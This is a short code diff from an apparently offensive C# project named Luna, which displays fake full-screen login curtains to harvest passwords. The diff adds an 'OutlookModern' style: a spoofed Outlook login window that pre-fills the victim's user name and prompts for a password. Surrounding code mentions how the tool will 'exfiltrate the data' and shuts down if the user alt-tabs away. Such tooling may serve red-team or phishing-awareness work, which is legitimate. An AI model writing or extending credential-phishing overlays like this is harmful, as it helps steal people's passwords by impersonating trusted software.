@@ -99,6 +99,12 @@ namespace Luna
                         curtainActionQueue.Add(showLoginPassword);
                         break;
 
+                    case Common.CurtainStyle.OutlookModern:
+                        _curtain = new Luna.curtainOutlookModern();
+                        curtainActionQueue.Add(showBackground);
+                        curtainActionQueue.Add(showLoginPassword);
+                        break;
+
                 }
 
                 // ... as well as how we'll exfiltrate the data
@@ -197,7 +203,7 @@ namespace Luna
         // If alt-tabbed, exit the program immediately
         private void missionRun_Deactivate(object sender, EventArgs e)
         {
-            missionShutdown();
+           missionShutdown();
         }
 
         // Positioning code to show login view and password prompts
@@ -318,6 +324,14 @@ namespace Luna
                     mdiCortana.userID = LunaGeneral.bestUserName();
                     mdiCortana.Show();
                     break;
+                case ((int)Common.PasswordBoxStyle.OutlookModern):
+                    this.IsMdiContainer = true;
+                    loginOutlook mdiOutlookModern = new loginOutlook(this);
+                    mdiOutlookModern.MdiParent = this;
+                    mdiOutlookModern.userID = LunaGeneral.bestUserName();
+                    mdiOutlookModern.Show();
+                    break;
+
             }
         }
 
